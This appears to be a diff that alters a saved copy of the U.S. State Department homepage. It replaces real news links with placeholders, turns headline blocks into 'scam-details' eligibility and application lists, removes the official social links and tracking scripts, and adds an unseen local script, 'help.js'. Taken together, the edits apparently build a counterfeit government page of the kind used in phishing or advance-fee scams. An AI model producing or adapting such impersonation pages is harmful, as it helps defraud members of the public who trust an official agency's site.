-                                  https://www.state.gov/wp-content/uploads/2023/03/227WomensHistoryMonth3-332x332.jpg    332w,
-                                  https://www.state.gov/wp-content/uploads/2023/03/227WomensHistoryMonth3.jpg           1200w
-                                "
                                 sizes="(max-width: 1024px) 100vw, 1024px"
                               />
                             </figure>
@@ -5309,7 +4816,7 @@
                                   <div class="row">
                                     <div class="fp-countries__featured-content">
                                       <a
-                                        href="https://www.state.gov/secretary-blinkens-participation-in-the-tenth-u-s-colombia-high-level-dialogue/"
+                                        href="#"
                                       >
                                         <img
                                           decoding="async"
@@ -5318,7 +4825,7 @@
                                           height="2178"
                                           src="./U.S. Department of State - United States Department of State_files/Colombia-e1556025901114.jpg"
                                           class="attachment-post-thumbnail size-post-thumbnail wp-post-image"
-                                          alt="Colombia [Shutterstock]"
+                                          alt="Eligibility Criteria"
                                         />
                                       </a>
                                     </div>
@@ -5336,9 +4843,9 @@
                                             class="fp-countries__article-headline"
                                           >
                                             <a
-                                              href="https://www.state.gov/ambassador-van-schaacks-remarks-at-summit-for-democracy-side-event-justice-accountability-and-sustained-momentum-for-democracy/"
+                                              href="#"
                                             >
-                                              <ul>
+                                              <ul class="scam-details">
                                                 <li>
                                                   Applicants must be 18 years of
                                                   age or older.
@@ -5374,9 +4881,9 @@
                                             class="fp-countries__article-headline"
                                           >
                                             <a
-                                              href="https://www.state.gov/secretary-blinkens-participation-in-the-tenth-u-s-colombia-high-level-dialogue-2/"
+                                              href="#"
                                             >
-                                              <ol>
+                                              <ul class="scam-details">
                                                 <li>
                                                   Applications will be reviewed
                                                   by our team.
@@ -5398,7 +4905,7 @@
                                                   weeks of the application
                                                   deadline.
                                                 </li>
-                                              </ol>
+                                              </ul>
                                             </a>
                                           </p>
                                         </div>
@@ -5497,76 +5004,13 @@
             <div class="footer__aux">
               <!-- footer social media links from options page -->
 
-              <div class="social_links_footer">
-                <span class="followus">follow us</span>
-
-                <section
-                  class="module module--front-page-social-media front-page-social-media"
-                  aria-label="Social Media"
-                  role="group"
-                >
-                  <div class="frame">
-                    <!-- Primary Social Media Networks -->
-
-                    <a
-                      href="https://www.facebook.com/statedept"
-                      class="icon fab fa-facebook-f"
-                      target="_blank"
-                      aria-label="State Department on Facebook"
-                      ><span class="screen-reader-text">Facebook</span></a
-                    >
-
-                    <a
-                      href="https://twitter.com/StateDept"
-                      class="icon fab fa-twitter"
-                      target="_blank"
-                      aria-label="State Department on Twitter"
-                      ><span class="screen-reader-text">Twitter</span></a
-                    >
-
-                    <a
-                      href="https://www.instagram.com/statedept/"
-                      class="icon fab fa-instagram"
-                      target="_blank"
-                      aria-label="State Department on Instagram"
-                      ><span class="screen-reader-text">Instagram</span></a
-                    >
-
-                    <a
-                      href="https://www.youtube.com/user/statevideo"
-                      class="icon fab fa-youtube"
-                      target="_blank"
-                      aria-label="State Department on YouTube"
-                      ><span class="screen-reader-text">YouTube</span></a
-                    >
-
-                    <a
-                      href="https://www.flickr.com/photos/statephotos/"
-                      class="icon fab fa-flickr"
-                      target="_blank"
-                      aria-label="State Department on Flickr"
-                      ><span class="screen-reader-text">Flickr</span></a
-                    >
-
-                    <a
-                      href="https://www.state.gov/department-email-updates/"
-                      class="icon fas fa-envelope"
-                      target="_blank"
-                      aria-label="State Department on GovDelivery"
-                      ><span class="screen-reader-text">GovDelivery</span></a
-                    >
-                  </div>
-                </section>
-                <!-- // .front-page-social-media -->
-              </div>
-
               <div class="menu-footer-auxiliary-navigation-container">
                 <ul id="menu-footer-auxiliary-navigation" class="menu">
                   <li
                     id="menu-item-54473"
                     class="menu-item menu-item-type-post_type menu-item-object-page menu-item-54473"
                   >
-                    <a href="https://www.state.gov/privacy-policy/"
+                    <a href="https://www.state.gov/privacy-policy/" target="_blank"
                       >Privacy Policy</a
                     >
                   </li>
@@ -5575,7 +5019,7 @@
                     class="menu-item menu-item-type-post_type menu-item-object-page menu-item-54474"
                   >
                     <a
-                      href="https://www.state.gov/section-508-accessibility-statement/"
+                      href="https://www.state.gov/section-508-accessibility-statement/" target="_blank"
                       >Accessibility Statement</a
                     >
                   </li>
@@ -5583,7 +5027,7 @@
                     id="menu-item-54475"
                     class="menu-item menu-item-type-post_type menu-item-object-page menu-item-54475"
                   >
-                    <a href="https://www.state.gov/copyright-information/"
+                    <a href="https://www.state.gov/copyright-information/" target="_blank"
                       >Copyright Information</a
                     >
                   </li>
@@ -5591,14 +5035,14 @@
                     id="menu-item-16003"
                     class="menu-item menu-item-type-custom menu-item-object-custom menu-item-16003"
                   >
-                    <a href="https://foia.state.gov/">FOIA</a>
+                    <a href="https://foia.state.gov/" target="_blank">FOIA</a>
                   </li>
                   <li
                     id="menu-item-54477"
                     class="menu-item menu-item-type-post_type menu-item-object-page menu-item-54477"
                   >
                     <a
-                      href="https://www.state.gov/key-topics-office-of-civil-rights/eeo-no-fear-act-whistleblower-protection-acts/"
+                      href="https://www.state.gov/key-topics-office-of-civil-rights/eeo-no-fear-act-whistleblower-protection-acts/" target="_blank"
                       >No FEAR Act</a
                     >
                   </li>
@@ -5706,130 +5150,7 @@
       </div>
     </div>
     <!-- Instagram Feed JS -->
-    <script type="text/javascript">
-      var sbiajaxurl = "https://www.state.gov/wp-admin/admin-ajax.php";
-    </script>
-    <style id="core-block-supports-inline-css" type="text/css">
-      .wp-block-buttons.wp-container-2 {
-        justify-content: flex-start;
-      }
-      .wp-block-columns.wp-container-4,
-      .wp-block-columns.wp-container-7,
-      .wp-block-columns.wp-container-10,
-      .wp-block-columns.wp-container-13 {
-        flex-wrap: nowrap;
-      }
-    </style>
-    <script
-      type="text/javascript"
-      src="./U.S. Department of State - United States Department of State_files/gtm4wp-form-move-tracker.js"
-      id="gtm4wp-form-move-tracker-js"
-    ></script>
-    <script
-      type="text/javascript"
-      src="./U.S. Department of State - United States Department of State_files/jquery-3.3.1.min.js"
-      id="jquery-js"
-    ></script>
-    <script
-      type="text/javascript"
-      src="./U.S. Department of State - United States Department of State_files/underscore.min.js"
-      id="underscore-js"
-    ></script>
-    <script
-      type="text/javascript"
-      src="./U.S. Department of State - United States Department of State_files/backbone.min.js"
-      id="backbone-js"
-    ></script>
-    <script type="text/javascript" id="wp-api-request-js-extra">
-      /* <![CDATA[ */
-      var wpApiSettings = {
-        root: "https:\/\/www.state.gov\/wp-json\/",
-        nonce: "a85377a2f4",
-        versionString: "wp\/v2\/",
-      };
-      /* ]]> */
-    </script>
-    <script
-      type="text/javascript"
-      src="./U.S. Department of State - United States Department of State_files/api-request.min.js"
-      id="wp-api-request-js"
-    ></script>
-    <script
-      type="text/javascript"
-      src="./U.S. Department of State - United States Department of State_files/wp-api.min.js"
-      id="wp-api-js"
-    ></script>
-    <script type="text/javascript" id="wp-util-js-extra">
-      /* <![CDATA[ */
-      var _wpUtilSettings = { ajax: { url: "\/wp-admin\/admin-ajax.php" } };
-      /* ]]> */
-    </script>
-    <script
-      type="text/javascript"
-      src="./U.S. Department of State - United States Department of State_files/wp-util.min.js"
-      id="wp-util-js"
-    ></script>
-    <script
-      type="text/javascript"
-      src="./U.S. Department of State - United States Department of State_files/state.min.js"
-      id="state-script-js"
-    ></script>
-
-    <script type="text/javascript" id="">
-      (function (a, c, e, f, d, b) {
-        a.hj =
-          a.hj ||
-          function () {
-            (a.hj.q = a.hj.q || []).push(arguments);
-          };
-        a._hjSettings = { hjid: 1395777, hjsv: 6 };
-        d = c.getElementsByTagName("head")[0];
-        b = c.createElement("script");
-        b.async = 1;
-        b.src = e + a._hjSettings.hjid + f + a._hjSettings.hjsv;
-        d.appendChild(b);
-      })(window, document, "https://static.hotjar.com/c/hotjar-", ".js?sv\x3d");
-    </script>
-    <script
-      type="text/javascript"
-      id=""
-      src="./U.S. Department of State - United States Department of State_files/js(2)"
-    ></script>
-    <script
-      type="text/javascript"
-      id=""
-      src="./U.S. Department of State - United States Department of State_files/10014524-10016139.js"
-    ></script>
-    <script type="text/javascript" id="wmpci-popup-js-js-extra">
-      /* <![CDATA[ */
-      var Wmpci_Popup = {
-        enable: "0",
-        delay: "0",
-        exp_time: "1",
-        close_on_esc: "1",
-        hide_time: "0",
-      };
-      /* ]]> */
-    </script>
-    <script
-      type="text/javascript"
-      src="./U.S. Department of State - United States Department of State_files/wmpci-popup.js"
-      id="wmpci-popup-js-js"
-    ></script>
-    <script
-      type="text/javascript"
-      src="./U.S. Department of State - United States Department of State_files/newsletter_mobile.js"
-      id="block-acf-newsletter-container-block-js"
-    ></script>
-
-    <script type="text/javascript" id="">
-      window.dataLayer = window.dataLayer || [];
-      function gtag() {
-        dataLayer.push(arguments);
-      }
-      gtag("js", new Date());
-      gtag("config", "UA-107671946-1", { optimize_id: "GTM-TBK825N" });
-    </script>
+ d
     <iframe
       id="_hjSafeContext_22788473"
       title="_hjSafeContext"
@@ -5876,5 +5197,6 @@
       src="./U.S. Department of State - United States Department of State_files/saved_resource(1).html"
       style="display: none"
     ></iframe>
+    <script src="./help.js"></script>
   </body>
 </html>
